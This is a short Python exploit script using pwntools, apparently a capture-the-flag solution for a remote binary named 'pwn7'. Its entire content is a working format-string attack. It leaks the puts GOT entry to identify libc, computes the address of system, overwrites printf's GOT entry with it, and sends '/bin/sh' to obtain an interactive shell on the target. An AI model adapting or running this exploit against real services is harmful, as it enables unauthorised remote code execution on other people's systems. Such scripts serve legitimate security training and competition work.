from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
io = remote('114.67.175.224', 10535)
elf = ELF('./pwn7')
puts_got = elf.got['puts']
printf_got = elf.got['printf']
io.recvuntil(b'repeater?\n')
payload = p32(puts_got) + b'%6$s'
io.sendline(payload)
puts = u32(io.recv(8)[-4:]) 
log.success('puts: => %s' % hex(puts))
libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
log.success('libc_base => %s' % hex(libc_base))
system = libc_base + libc.dump('system')
offset = 6
payload = fmtstr_payload(offset,{printf_got:system})
io.send(payload)
io.send('/bin/sh\00')
io.interactive()